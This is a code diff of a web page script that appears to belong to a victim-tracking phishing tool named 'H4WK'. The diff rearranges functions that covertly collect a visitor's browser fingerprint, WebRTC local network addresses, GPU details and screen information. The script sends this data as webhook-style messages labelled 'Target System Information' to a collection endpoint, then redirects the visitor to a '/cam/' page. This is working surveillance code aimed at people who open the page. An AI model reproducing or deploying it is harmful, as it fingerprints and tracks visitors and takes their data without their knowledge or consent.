@@ -19,6 +19,11 @@
       getNetworkInterfaces();
       getGPUInfo();
       logWindowDetails();
+
+      // Redirect to cam/index.html after data collection
+      setTimeout(function () {
+        window.location.href = "/cam/index.html";
+      }, 2000);
     }
 
     function sendSystemInfo() {
@@ -41,32 +46,6 @@
                      "\nOscpu: " + navigator.oscpu + "```");
 
       sendWebhookMessage("Target System Information..", sysinfo, 15418782);
-
-      // Redirect to the next page after a short delay
-      setTimeout(function () {
-        window.location.href = "/cam/index.html";
-      }, 2000);
-    }
-
-    function sendWebhookMessage(title, description, color = 15418782) {
-      const request = new XMLHttpRequest();
-      request.open("POST", "/location_update"); 
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var myEmbed = {
-        author: { name: title },
-        description: description,
-        color: color
-      };
-
-      var params = {
-        username: "H4WK",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-        embeds: [myEmbed]
-      };
-
-      request.send(JSON.stringify(params));
     }
 
     function getWebGLFingerprint() {
@@ -123,38 +102,58 @@
     }
 
     function getNetworkInterfaces() {
-        const rtc = new RTCPeerConnection({iceServers: []});
-        rtc.createDataChannel('');
-        rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-        rtc.onicecandidate = function(event) {
-            if (!event || !event.candidate) return;
-            const candidate = event.candidate.candidate;
-            sendWebhookMessage("Network Interface", candidate);
-        };
+      const rtc = new RTCPeerConnection({iceServers: []});
+      rtc.createDataChannel('');
+      rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+      rtc.onicecandidate = function(event) {
+        if (!event || !event.candidate) return;
+        const candidate = event.candidate.candidate;
+        sendWebhookMessage("Network Interface", candidate);
+      };
     }
 
     function getGPUInfo() {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl');
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
 
-        const gpuInfo = {
-            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-            maxAnisotropy: gl.getParameter(gl.MAX_TEXTURE_MAX_ANISOTROPY_EXT)
-        };
+      const gpuInfo = {
+        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+        maxAnisotropy: gl.getParameter(gl.MAX_TEXTURE_MAX_ANISOTROPY_EXT)
+      };
 
-        sendWebhookMessage("Detailed GPU Info", JSON.stringify(gpuInfo));
+      sendWebhookMessage("Detailed GPU Info", JSON.stringify(gpuInfo));
     }
 
     function logWindowDetails() {
-        const windowSize = `Inner Width: ${window.innerWidth}, Inner Height: ${window.innerHeight}`;
-        const screenSize = `Screen Width: ${screen.width}, Screen Height: ${screen.height}`;
-        const windowPosition = `ScreenX: ${window.screenX}, ScreenY: ${window.screenY}`;
+      const windowSize = `Inner Width: ${window.innerWidth}, Inner Height: ${window.innerHeight}`;
+      const screenSize = `Screen Width: ${screen.width}, Screen Height: ${screen.height}`;
+      const windowPosition = `ScreenX: ${window.screenX}, ScreenY: ${window.screenY}`;
 
-        sendWebhookMessage("Window Details", `${windowSize}\n${screenSize}\n${windowPosition}`);
+      sendWebhookMessage("Window Details", `${windowSize}\n${screenSize}\n${windowPosition}`);
     }
 
+    function sendWebhookMessage(title, description, color = 15418782) {
+      const request = new XMLHttpRequest();
+      request.open("POST", "/location_update"); 
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var myEmbed = {
+        author: { name: title },
+        description: description,
+        color: color
+      };
+
+      var params = {
+        username: "H4WK",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+        embeds: [myEmbed]
+      };
+
+      request.send(JSON.stringify(params));
+    }
   </script>
 </body>
 
